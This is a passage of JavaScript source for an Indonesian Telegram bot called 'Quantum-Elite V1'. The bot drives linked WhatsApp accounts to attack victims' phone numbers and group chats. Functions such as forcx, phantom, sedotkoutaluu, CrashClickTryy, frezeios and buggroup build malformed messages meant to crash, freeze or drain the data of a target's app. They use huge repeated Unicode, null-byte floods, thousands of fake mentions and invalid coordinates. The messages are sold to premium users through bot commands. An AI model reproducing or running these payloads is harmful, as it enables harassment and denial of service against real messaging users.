        text: "ANGELESb҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉b҉⃝҉⃝҉⃝҉⃝҉⃝b҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝ANGELESཀ‌‌\\>🍷𞋯" + "ꦾ".repeat(299986),
        contextInfo: {
          participant: target,
          mentionedJid: [
            "0@s.whatsapp.net",
            ...Array.from(
              { length: 1900 },
              () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
            )
          ]
        }
      }
    };

    const delay001 = generateWAMessageFromContent(target, delay2, {});
    await sock.relayMessage("status@broadcast", delay001.message, {
      messageId: delay001.key.id,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [
            { tag: "to", attrs: { jid: target }, content: undefined }
          ]
        }]
      }]
    });

    await sock.relayMessage("status@broadcast", delay1.message, {
      messageId: delay1.key.id,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [
            { tag: "to", attrs: { jid: target }, content: undefined }
          ]
        }]
      }]
    });

  } catch (error) {
    console.error("Error di :", error, "Fix Sendiri Lu Kan Dev🤓");
  }

async function handleforcx(chatId, targetNumber, senderNumber) {
  const sock   = senders[senderNumber]?.sock;
  const target = formatJID(targetNumber);
  if (!sock) throw new Error(`Sock sender ${senderNumber} ᴘᴀsᴀɴɢ sᴇɴᴅᴇʀ ᴅᴜʟᴜ ʙᴏᴅᴏʜ.`);

  await bot.sendMessage(
    chatId,
    `*ғᴏʀᴄx — ᴅᴇʟᴀʏ ʜᴀʀᴅ ᴛᴀʀɢᴇᴛ*\nᴍᴇɴɢɪʀɪᴍ ʙᴜɢ: *${targetNumber}*`,
    { parse_mode: "Markdown" });
  await forcx(target, sock);
  await bot.sendMessage(
    chatId,
    ` *sᴜᴋsᴇs ᴍᴇɴɢɪʀɪᴍ*\n\nTarget : *${targetNumber}*\nᴊᴇɴɪs ʙᴜɢ  : *ғᴏʀᴄx*\nsᴛᴀᴛᴜs : ʙᴇʀʜᴀsɪʟ`,
    {
      parse_mode  : "Markdown",
      reply_markup: { inline_keyboard: [[{ text: "ᴄᴇᴋᴛᴀʀɢᴇᴛ", url: `https://wa.me/${targetNumber}` }]] },
    }
  );
}

// ┌──────────────────────────────────────────────┐
// │  FUNC QUANTUMBLANK — systemui                │
// └──────────────────────────────────────────────┘
async function phantom(target) {
const msg = {
    newsletterAdminInviteMessage: {
      newsletterJid: "@newsletter",
      newsletterName: "⍣᳟༑ Nazee?༑⃟꙳" + "ꦽ".repeat(5000) + "ោ៝".repeat(4500),
      caption: "⍣᳟༑ Nazee?༑⃟꙳" + "ꦽ".repeat(5000) + "ោ៝".repeat(4500),
      inviteExpiration: "999999999"
    }
  };

  await sock.relayMessage(target, msg, {
    participant: { jid: target },
    messageId: null
  });
}

async function handlephantom(chatId, targetNumber, senderNumber) {
  const sock   = senders[senderNumber]?.sock;
  const target = formatJID(targetNumber);
  if (!sock) throw new Error(`Sock sender ${senderNumber} tidak ditemukan.`);
  await bot.sendMessage(chatId, `*ᴘʜᴀɴᴛᴏᴍ - ʙʟᴀɴᴋ*\nᴍᴇɴɢɪʀɪᴍ ʙᴜɢ: *${targetNumber}*`, { parse_mode: "Markdown" });
  await phantom(target, sock);
  await bot.sendMessage(
    chatId,
    ` *sᴜᴋsᴇs ᴍᴇɴɢɪʀɪᴍ*\n\nTarget : *${targetNumber}*\nᴊᴇɴɪs ʙᴜɢ  : *ᴘʜᴀɴᴛᴏᴍ*\nsᴛᴀᴛᴜs : ʙᴇʀʜᴀsɪʟ`,
    {
      parse_mode  : "Markdown",
      reply_markup: { inline_keyboard: [[{ text: "ᴄᴇᴋ ᴛᴀʀɢᴇᴛ", url: `https://wa.me/${targetNumber}` }]] },
    }
  );
}

// ┌──────────────────────────────────────────────┐
// │  FUNC QUANTUMBUG — sedotkoutaluu             │
// └──────────────────────────────────────────────┘
async function sedotkoutaluu(target, sock) {
  const doc = {
    imageMessage: {
      url: 'https://mmg.whatsapp.net/m1/v/t24/An_qcbaV8YTP-HtiB1VFAie8c-VqF4bBnMHWKN--GFd6T2GW-pQwLHQe4K4eDKCS1Fv9DZCa6RXMDsLeabNqy8RoTIekx2LtJCM-iUtOu_sdK90zdCEu1l8Wwqj3KAHrNRd1?ccb=10-5&oh=01_Q5Aa4AEbsVLrEjUg9wGPpN5mT_DeeyZp0Obyl7Cp7X5CHZ4mSA&oe=69D77DE6&_nc_sid=5e03e0&mms3=true',
      directPath: '/m1/v/t24/An_qcbaV8YTP-HtiB1VFAie8c-VqF4bBnMHWKN--GFd6T2GW-pQwLHQe4K4eDKCS1Fv9DZCa6RXMDsLeabNqy8RoTIekx2LtJCM-iUtOu_sdK90zdCEu1l8Wwqj3KAHrNRd1?ccb=10-5&oh=01_Q5Aa4AEbsVLrEjUg9wGPpN5mT_DeeyZp0Obyl7Cp7X5CHZ4mSA&oe=69D77DE6&_nc_sid=5e03e0',
      mediaKey      : Buffer.alloc(32),
      fileSha256    : 'lOzzPjzVDfakRkXD9ud+N/JGUHVsmn37eqDk0UijQdA=',
      fileEncSha256 : Buffer.alloc(32),
      viewOnce      : true,
      caption       : "\u0000".repeat(10000),
      isHd          : true,
      fileLength    : 5000000,
      mimetype      : "image/jpeg",
      pageCount     : 999,
      jpegThumbnail : Buffer.from([99,88,77,66,55,44,33,22,11,0]),
      contextInfo   : {
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from({ length: 1999 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
        ],
        forwardingScore: 999,
        isForwarded    : true,
        quotedMessage  : {
          conversation: "Hey! Hope you're good" + "\u0000".repeat(10000),
        },
      },
    },
  };

  const card = {
    header: {
      imageMessage     : doc.imageMessage,
      hasMediaAttachment: true,
    },
    body: { text: "" },
    nativeFlowMessage: {
      messageParamsJson: "{".repeat(10000),
    },
  };

  const msg1 = {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata       : {},
          deviceListMetadataVersion: 2,
        },
        interactiveMessage: {
          body: { text: "áá".repeat(20000) },
          carouselMessage: {
            cards: Array.from({ length: 10 }, () => card),
          },
          nativeFlowMessage: {
            messageParamsJson: "{".repeat(1000),
          },
        },
      },
    },
  };

  const Msg = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            title             : "Hey! Hope you're good",
            hasMediaAttachment: false,
            locationMessage   : {
              degreesLatitude : -929.03499999999999,
              degreesLongitude: 992.999999999999,
              name            : "Haii Apa Kabar",
              address         : "áá".repeat(1000),
            },
          },
          body: { text: "World".repeat(20000) },
          nativeFlowMessage: {
            messageParamsJson: "{".repeat(10000),
          },
        },
      },
    },
  };

  for (let i = 0; i < 5; i++) {
    try {
      await sock.relayMessage(target, Msg, {});
      await sock.relayMessage(target, msg1, {});
      await new Promise(r => setTimeout(r, 3000));
    } catch (err) {
      console.log(`\x1b[31mLoop ${i+1} failed to ${target}: ${err}\x1b[0m`);
    }
  }
}

async function handleQuantumBug(chatId, targetNumber, senderNumber) {
  const sock   = senders[senderNumber]?.sock;
  const target = formatJID(targetNumber);
  if (!sock) throw new Error(`Sock sender ${senderNumber} tidak ditemukan.`);

  await bot.sendMessage(
    chatId,
    `🌀 *QuantumBug aktif...*\nMengirim ke: *${targetNumber}*`,
    { parse_mode: "Markdown" }
  );

  await sedotkoutaluu(target, sock);

  await bot.sendMessage(
    chatId,
    `📤 *Sukses Mengirim*\n\nTarget : *${targetNumber}*\nJenis  : *QuantumBug*\nStatus : ✅ Berhasil`,
    {
      parse_mode  : "Markdown",
      reply_markup: { inline_keyboard: [[{ text: "🎯 Cek Target", url: `https://wa.me/${targetNumber}` }]] },
    }
  );
}

// ┌──────────────────────────────────────────────┐
// │  FUNC QUANTUMCRASH — CrashClickTryy          │
// └──────────────────────────────────────────────┘
async function CrashClickTryy(target, sock) {
  let message = {
    interactiveMessage: {
      header: {
        title: "How have you been?",
        locationMessage: {
          degreesLatitude : 9.99999,
          degreesLongitude: -9.99999,
        },
        hasMediaAttachent: true,
      },
      body: { text: "Long time, no see!" },
      nativeFlowMessage: {
        buttons: [
          { name: "single_select",  buttonParamsJson: "" },
          { name: "address_message", buttonParamsJson: "" },
        ],
        messageParamsJson: "{}",
      },
      contextInfo: {
        participant : target,
        mentionedJid: [target],
      },
    },
  };

  await sock.relayMessage(target, message, {
    messageId  : null,
    participant: { jid: target },
  });
}

async function handleQuantumCrash(chatId, targetNumber, senderNumber) {
  const sock   = senders[senderNumber]?.sock;
  const target = formatJID(targetNumber);
  if (!sock) throw new Error(`Sock sender ${senderNumber} tidak ditemukan.`);

  await bot.sendMessage(
    chatId,
    `💀 *QuantumCrash aktif...*\nMengirim ke: *${targetNumber}*`,
    { parse_mode: "Markdown" }
  );

  await CrashClickTryy(target, sock);

  await bot.sendMessage(
    chatId,
    `📤 *Sukses Mengirim*\n\nTarget : *${targetNumber}*\nJenis  : *QuantumCrash*\nStatus : ✅ Berhasil`,
    {
      parse_mode  : "Markdown",
      reply_markup: { inline_keyboard: [[{ text: "🎯 Cek Target", url: `https://wa.me/${targetNumber}` }]] },
    }
  );
}

// ┌──────────────────────────────────────────────┐
// │  FUNC QUANTUMIOS — frezeios                  │
// └──────────────────────────────────────────────┘
async function frezeios(target, sock) {
  try {
    const m = await generateWAMessageFromContent(target, {
      locationMessage: {
        degreesLatitude : 1e15,
        degreesLongitude: 1e15,
        name            : 'ြ'.repeat(30000),
        address         : 'ြ'.repeat(30000),
        isLive          : true,
        accuracyInMeters: 1e15,
        jpegThumbnail   : Buffer.alloc(0),
      },
    }, {
      userJid: sock.user.id,
      upload : sock.waUploadToServer,
    });
    await sock.relayMessage(target, m.message, {
      participant: { jid: target },
      messageId  : m.key.id,
    });
  } catch (error) {
    console.error("frezeios error:", error.message);
  }
}

async function handleQuantumIos(chatId, targetNumber, senderNumber) {
  const sock   = senders[senderNumber]?.sock;
  const target = formatJID(targetNumber);
  if (!sock) throw new Error(`Sock sender ${senderNumber} tidak ditemukan.`);
  await bot.sendMessage(chatId, `🍎 *QuantumIOS aktif...*\nMengirim ke: *${targetNumber}*`, { parse_mode: "Markdown" });
  await frezeios(target, sock);
  await bot.sendMessage(
    chatId,
    `📤 *Sukses Mengirim*\n\nTarget : *${targetNumber}*\nJenis  : *QuantumIOS*\nStatus : ✅ Berhasil`,
    {
      parse_mode  : "Markdown",
      reply_markup: { inline_keyboard: [[{ text: "🎯 Cek Target", url: `https://wa.me/${targetNumber}` }]] },
    }
  );
}

// ┌──────────────────────────────────────────────┐
// │  FUNC QUANTUMUI — InteractiveUI              │
// └──────────────────────────────────────────────┘
async function InteractiveUI(target, sock) {
  await sock.relayMessage(target, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            hasMediaAttachment: false,
            title: " &MampusHpLuu\n\n" + "ꦽ".repeat(50000),
          },
          body: { text: "" },
          nativeFlowMessage: {
            name            : "single_select",
            messageParamsJson: "",
          },
          payment: {
            name            : "galaxy_message",
            messageParamsJson: '{"icon":"DOCUMENT","flow_cta":"\\u0000","flow_message_version":"3"}',
          },
        },
      },
    },
  }, {});
}

async function handleQuantumUI(chatId, targetNumber, senderNumber) {
  const sock   = senders[senderNumber]?.sock;
  const target = formatJID(targetNumber);
  if (!sock) throw new Error(`Sock sender ${senderNumber} tidak ditemukan.`);
  await bot.sendMessage(chatId, `🖥️ *QuantumUI aktif...*\nMengirim ke: *${targetNumber}*`, { parse_mode: "Markdown" });
  await InteractiveUI(target, sock);
  await bot.sendMessage(
    chatId,
    `📤 *Sukses Mengirim*\n\nTarget : *${targetNumber}*\nJenis  : *QuantumUI*\nStatus : ✅ Berhasil`,
    {
      parse_mode  : "Markdown",
      reply_markup: { inline_keyboard: [[{ text: "🎯 Cek Target", url: `https://wa.me/${targetNumber}` }]] },
    }
  );
}

// ┌──────────────────────────────────────────────┐
// │  FUNC XBLANKGROUP — DelayInvisGroup          │
// └──────────────────────────────────────────────┘
async function buggroup(groupJid, jids = false) {
      var messageContent = generateWAMessageFromContent(groupJid, proto.Message.fromObject({
             'viewOnceMessage': {
                    'message': {
                           "newsletterAdminInviteMessage": {
                                  "newsletterJid": `120363298524333143@newsletter`,
                                  "newsletterName": "HALO KING FORCX LEWAT DULU" + "ғᴏʀᴄx".repeat(60000) + "\u0000".repeat(920000),
                                  "jpegThumbnail": "",
                                  "caption": "Newsletter Admin Invite",
                                  "inviteExpiration": Date.now() + 1814400000
                           }
                    }
             }
      }), {
             'userJid': groupJid
      });

      await sock.relayMessage(groupJid, messageContent.message, jids ? {
             'participant': { 
                   'jid': groupJid
             }
      } : {});
}

async function handlebuggroup(chatId, rawLink, fromUser) {
  const username = fromUser?.username ? `@${fromUser.username}` : (fromUser?.first_name || "Unknown");
  const date     = getCurrentDate();

  if (!/^https:\/\/chat\.whatsapp\.com\/[A-Za-z0-9]+(\?.*)?$/.test(rawLink)) {
    return bot.sendMessage(chatId, `⚠️ *Link grup tidak valid!*\nContoh: \`https://chat.whatsapp.com/xxxx\``, { parse_mode: "Markdown" });
  }

  const senderKey = getActiveSender();
  if (!senderKey) {
    return bot.sendMessage(chatId, "⚠️ *Tidak ada sender aktif!*\nSilakan tambah sender dulu via /addsender 628xx", backMenuKeyboard());
  }
  const scarry = senders[senderKey]?.sock;

  const baseCaption =
    `<blockquote>╭───「 Bug Group Mode 」───\n` +
    `│ 〆 By            : {USER}\n` +
    `│ 〆 Target        : {TARGET}\n` +
    `│ 〆 Dispatch Type : Group Blank Action\n` +
    `│ 〆 Status        : {STATUS}\n` +
    `│ 〆 Date          : {DATE}\n` +
    `╰────────────────</blockquote>`;

  const safeTarget = escapeHtml(rawLink);
  const safeUser   = escapeHtml(username);
  const safeDate   = escapeHtml(date);

  const sentMessage = await bot.sendMessage(
    chatId,
    baseCaption.replace("{USER}",safeUser).replace("{TARGET}",safeTarget).replace("{DATE}",safeDate).replace("{STATUS}","Processing..."),
    { parse_mode: "HTML" }
  );

  const groupCode = rawLink.split("https://chat.whatsapp.com/")[1].split("?")[0];
  let groupJid;

  try {
    groupJid = await scarry.groupAcceptInvite(groupCode);
    await bot.editMessageText(
      baseCaption.replace("{USER}",safeUser).replace("{TARGET}",safeTarget).replace("{DATE}",safeDate).replace("{STATUS}","Joined Group Successfully"),
      { chat_id: chatId, message_id: sentMessage.message_id, parse_mode: "HTML" }
    );
  } catch (e) {
    const err = (e?.message || "").toLowerCase();
    if (err.includes("forbidden")||err.includes("401")||err.includes("403")||err.includes("not-authorized")) {
      return bot.editMessageText(`❌ Gagal masuk grup!\n\nGrup bersifat PRIVATE atau memerlukan persetujuan admin.`, { chat_id: chatId, message_id: sentMessage.message_id });
    }
    if (err.includes("already")||err.includes("member")||err.includes("exists")||err.includes("conflict")) {
      try {
        const inviteInfo = await scarry.groupGetInviteInfo(groupCode);
        if (!inviteInfo || !inviteInfo.id) return bot.editMessageText(`❌ Gagal ambil info grup (link expired).`, { chat_id: chatId, message_id: sentMessage.message_id });
        groupJid = inviteInfo.id;
      } catch (err2) {
        return bot.editMessageText(`❌ Gagal ambil info grup: ${err2?.message || "forbidden / link expired"}`, { chat_id: chatId, message_id: sentMessage.message_id });
      }
    } else {
      return bot.editMessageText(`❌ Gagal join grup: ${e?.message || "Unknown error"}`, { chat_id: chatId, message_id: sentMessage.message_id });
    }
  }

  if (!groupJid || typeof groupJid !== "string" || !groupJid.includes("@g.us")) {
    return bot.editMessageText(`❌ groupJid tidak valid (link expired/dibatasi).`, { chat_id: chatId, message_id: sentMessage.message_id });
  }

  console.log("\x1b[33m[PROSES]\x1b[0m Mengirim ke grup...");
  await murbugraa1(groupJid);
  console.log("\x1b[32m[SUCCESS]\x1b[0m Berhasil dikirim 🚀");

  await bot.editMessageText(
    baseCaption.replace("{USER}",safeUser).replace("{TARGET}",safeTarget).replace("{DATE}",safeDate).replace("{STATUS}","✅ Sukses dikirim!"),
    {
      chat_id: chatId, message_id: sentMessage.message_id, parse_mode: "HTML",
      reply_markup: { inline_keyboard: [[{ text: "CEK • GROUP", url: rawLink }],[{ text: "🏠 Kembali ke Menu", callback_data: "back_menu" }]] },
    }
  );

  await bot.sendMessage(
    chatId,
    `📤 *Sukses Mengirim*\n\nTarget : *${escapeHtml(rawLink)}*\nJenis  : *QuantumGroup*\nStatus : ✅ Berhasil`,
    { parse_mode: "Markdown", ...backMenuKeyboard() }
  );
}

// =============================================
//   COMMANDS
// =============================================

// /start & /menu
bot.onText(/\/(start|menu)/, async (msg) => {
  await sendMainMenu(msg.chat.id, msg.from);
});

// /myid
bot.onText(/\/myid/, async (msg) => {
  await bot.sendMessage(msg.chat.id, `🪪 *Telegram ID kamu:*\n\`${msg.from.id}\``, { parse_mode: "Markdown" });
});

// /ping
bot.onText(/\/ping/, async (msg) => {
  const chatId = msg.chat.id;
  const start  = Date.now();
  const sent   = await bot.sendMessage(chatId, "🏓 Pinging...");
  const latency = Date.now() - start;
  await bot.editMessageText(
    `🏓 *Pong!*\n\n📡 Latency : \`${latency}ms\`\n🟢 Status  : Online`,
    { chat_id: chatId, message_id: sent.message_id, parse_mode: "Markdown" }
  );
});

// /info
bot.onText(/\/info/, async (msg) => {
  const chatId = msg.chat.id;
  const user   = msg.from;
  const role   = isOwner(user.id)
    ? "👑 Owner"
    : isPremium(user.id)
    ? "⭐ Premium"
    : "👤 User";

  const name     = [user.first_name, user.last_name].filter(Boolean).join(" ");
  const username = user.username ? `@${user.username}` : "Tidak ada";
  const activeSender = getActiveSender() || "Tidak ada";

  await bot.sendMessage(chatId,
    `╔══════════════════╗\n` +
    `║   📋  USER INFO   ║\n` +
    `╚══════════════════╝\n\n` +
    `👤 *Nama*     : ${name}\n` +
    `🪪 *ID*       : \`${user.id}\`\n` +
    `📌 *Username* : ${username}\n` +
    `🎖 *Tahta*    : ${role}\n\n` +
    `📡 *Sender Aktif* : \`${activeSender}\`\n` +
    `🤖 *Bot*      : Quantum-Elite V1`,
    { parse_mode: "Markdown", ...backMenuKeyboard() }
  );
});

// /addsender (tanpa nomor)
bot.onText(/\/addsender$/, async (msg) => {
  await bot.sendMessage(
    msg.chat.id,
    `*ᴍᴀɴᴀ ɴᴏᴍᴏʀ sᴇɴᴅᴇʀɴʏᴀ ʙᴜᴊᴀɴɢ?*\n\n` +
    `Contoh:\n` +
    `  \`/addsender 628123456789\` _(Indonesia)_\n` +
    `  \`/addsender 14155552671\` _(USA)_\n` +
    `  \`/addsender 447911123456\` _(UK)_`,
    { parse_mode: "Markdown" }
  );
});

// /addsender nomor (multi-region)
bot.onText(/\/addsender (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const raw    = match[1].trim().replace(/\D/g, "");

  if (raw.length < 7 || raw.length > 15) {
    return bot.sendMessage(chatId,
      "*ɴᴏᴍᴏʀɴʏᴀ ɢᴀ ᴠᴀʟɪᴅ ʏᴀ ᴀɴᴊɪɴɢ!*\nᴘᴀsᴛɪɪɴ ɴᴏᴍᴏʀɴʏᴀ ʙᴇɴᴀʀ ʏᴀ ᴀɴᴊɪɴɢ.\nContoh: `628123456789` atau `14155552671`",
      { parse_mode: "Markdown" }
    );
  }

  const detected = detectCountries(raw);
  if (!detected) {
    return bot.sendMessage(chatId,
      "*ᴋᴏᴅᴇ ɴᴇɢᴀʀᴀɴʏᴀ ɢᴀᴋ ᴠᴀʟɪᴅ!*\nᴘᴀsᴛɪɪɴ ɴᴏᴍᴏʀɴʏᴀ ʙᴇɴᴀʀ ʏᴀ ᴀɴᴊɪɴɢ.\nContoh: `62` (ID), `1` (US), `44` (UK)",
      { parse_mode: "Markdown" }
    );
  }

  const { entry } = detected;

  // Kalau prefix dipakai banyak negara → tampilkan button pilih
  if (entry.countries.length > 1) {
    // Simpan nomor di state dulu, tunggu user pilih negara
    userState[chatId] = { step: "addsender_choose_country", rawNum: raw };

    // Buat inline keyboard, max 2 per baris
    const buttons = entry.countries.map(c => ({
      text         : c.name,
      callback_data: `country_${raw}_${c.dial}`,
    }));
    const rows = [];
    for (let i = 0; i < buttons.length; i += 2) {
      rows.push(buttons.slice(i, i + 2));
    }
    rows.push([{ text: "❌ Batalkan", callback_data: "cancel_addsender" }]);

    return bot.sendMessage(chatId,
      `🌍 *Prefix +${entry.code} digunakan oleh beberapa negara.*\nPilih negara untuk nomor \`${raw}\`:`,
      { parse_mode: "Markdown", reply_markup: { inline_keyboard: rows } }
    );
  }

  // Prefix unik, langsung connect
  const finalNum = raw;
  if (senders[finalNum] && senders[finalNum].status === "connected") {
    return bot.sendMessage(chatId, `⚠️ *Sender ${finalNum} sudah terhubung!*`, backMenuKeyboard());
  }

  await bot.sendMessage(chatId,
    `🔗 *Menghubungkan sender ${finalNum}...*\n🌍 Negara: ${entry.countries[0].name}\nKode pairing akan segera muncul.\n\nIngin batalkan?`,
    cancelKeyboard()
  );
  await connectSender(chatId, finalNum);
});

// /listsender
bot.onText(/\/listsender/, async (msg) => {
  const chatId = msg.chat.id;
  const keys   = Object.keys(senders);
  if (keys.length === 0) return bot.sendMessage(chatId, "📋 *Belum ada sender terdaftar.*\nTambahkan via /addsender", { parse_mode: "Markdown" });

  const list = keys.map((n) => `• \`${n}\` — ${senders[n].status === "connected" ? "🟢 Connected" : "🔴 Disconnected"}`).join("\n");
  const buttons = keys.map((n) => [{ text: `🗑 Hapus ${n}`, callback_data: `del_sender_${n}` }]);
  buttons.push([{ text: "🏠 Kembali ke Menu", callback_data: "back_menu" }]);

  await bot.sendMessage(chatId,
    `📋 *Daftar Sender:*\n\n${list}`,
    { parse_mode: "Markdown", reply_markup: { inline_keyboard: buttons } }
  );
});

// /quantumdelay (tanpa nomor)
bot.onText(/\/Forcx$/, async (msg) => {
  await bot.sendMessage(msg.chat.id, `*ᴍᴀɴᴀ ɴᴏᴍᴏʀ ᴛᴀʀɢᴇᴛɴʏᴀ ᴄᴜɴɢ? ɢɪᴍᴀɴᴀ ᴄᴀʀᴀ ɢᴡ ʙᴜɢ ᴋʟᴏ ʟᴜ ɢᴀ ɴɢɪʀɪᴍ ɴᴏᴍᴏʀ ᴛᴀʀɢᴇᴛ*\n\nContoh: \`/Forcx 628123456789\``, { parse_mode: "Markdown" });
});

// /quantumdelay 628xx
bot.onText(/\/Forcx (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isPremium(msg.from.id)) return denyAccess(chatId);
  const input  = match[1].trim();
  if (!isValidNumber(input)) return bot.sendMessage(chatId, "*ғᴏʀᴍᴀᴛ sᴀʟᴀʜ ᴛᴏʟᴏʟ!*\nContoh: `/Forcx 628123456789`", { parse_mode: "Markdown" });
  const num = input.replace(/\D/g, "");
  await runWithSender(chatId, (sender) => handleforcx(chatId, num, sender));
});

// /quantumblank (tanpa nomor)
bot.onText(/\/Phantom$/, async (msg) => {
  await bot.sendMessage(msg.chat.id, `*ᴍᴀɴᴀ ɴᴏᴍᴏʀ ᴛᴀʀɢᴇᴛɴʏᴀ ᴄᴜɴɢ? ɢɪᴍᴀɴᴀ ᴄᴀʀᴀ ɢᴡ ʙᴜɢ ᴋʟᴏ ʟᴜ ɢᴀ ɴɢɪʀɪᴍ ɴᴏᴍᴏʀ ᴛᴀʀɢᴇᴛ*\n\nContoh: \`/Phantom 628123456789\``, { parse_mode: "Markdown" });
});

// /quantumblank 628xx
bot.onText(/\/Phantom (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isPremium(msg.from.id)) return denyAccess(chatId);
  const input  = match[1].trim();
  if (!isValidNumber(input)) return bot.sendMessage(chatId, "*ғᴏʀᴍᴀᴛ sᴀʟᴀʜ ᴛᴏʟᴏʟ!*\nContoh: `/Phantom 628123456789`", { parse_mode: "Markdown" });
  const num = input.replace(/\D/g, "");
  await runWithSender(chatId, (sender) => handlephantom(chatId, num, sender));
});

// /quantumbug (tanpa nomor)
bot.onText(/\/quantumbug$/, async (msg) => {
  await bot.sendMessage(msg.chat.id, `😅 *Nomor Targetnya Jangan Lupa Diisi Bang, bagaimana Aku Kirim Kalo Kamu Aja Engga Kasih Nomor*\n\nContoh: \`/quantumbug 628123456789\``, { parse_mode: "Markdown" });
});

// /quantumbug 628xx
bot.onText(/\/quantumbug (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isPremium(msg.from.id)) return denyAccess(chatId);
  const input  = match[1].trim();
  if (!isValidNumber(input)) return bot.sendMessage(chatId, "❌ *Format nomor salah!*\nContoh: `/quantumbug 628123456789`", { parse_mode: "Markdown" });
  const num = input.replace(/\D/g, "");
  await runWithSender(chatId, (sender) => handleQuantumBug(chatId, num, sender));
});

// /quantumgroup (tanpa link)
bot.onText(/\/buggroup$/, async (msg) => {
  await bot.sendMessage(msg.chat.id, `*ᴍᴀɴᴀ ʟɪɴᴋ ᴛᴀʀɢᴇᴛɴʏᴀ ᴄᴜɴɢ? ɢɪᴍᴀɴᴀ ᴄᴀʀᴀ ɢᴡ ʙᴜɢ ᴋʟᴏ ʟᴜ ɢᴀ ɴɢɪʀɪᴍ ɴᴏᴍᴏʀ ᴛᴀʀɢᴇᴛ*\n\nContoh: \`/buggroup https://chat.whatsapp.com/xxxx\``, { parse_mode: "Markdown" });
});

// /quantumgroup link
bot.onText(/\/buggroup (.+)/, async (msg, match) => {
  const chatId  = msg.chat.id;
  if (!isPremium(msg.from.id)) return denyAccess(chatId);
  const rawLink = match[1].trim();
  try { await handleQuantumGroup(chatId, rawLink, msg.from); }
  catch (error) { await bot.sendMessage(chatId, `Terjadi kesalahan sistem.`); console.error(error); }
});

// /quantumcrash (tanpa nomor)
bot.onText(/\/quantumcrash$/, async (msg) => {
  await bot.sendMessage(msg.chat.id, `😅 *Nomor Targetnya Jangan Lupa Diisi Bang, bagaimana Aku Kirim Kalo Kamu Aja Engga Kasih Nomor*\n\nContoh: \`/quantumcrash 628123456789\``, { parse_mode: "Markdown" });
});

// /quantumcrash 628xx
bot.onText(/\/quantumcrash (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isPremium(msg.from.id)) return denyAccess(chatId);
  const input  = match[1].trim();
  if (!isValidNumber(input)) return bot.sendMessage(chatId, "❌ *Format nomor salah!*\nContoh: `/quantumcrash 628123456789`", { parse_mode: "Markdown" });
  const num = input.replace(/\D/g, "");
  await runWithSender(chatId, (sender) => handleQuantumCrash(chatId, num, sender));
});

// /quantumios (tanpa nomor)
bot.onText(/\/quantumios$/, async (msg) => {
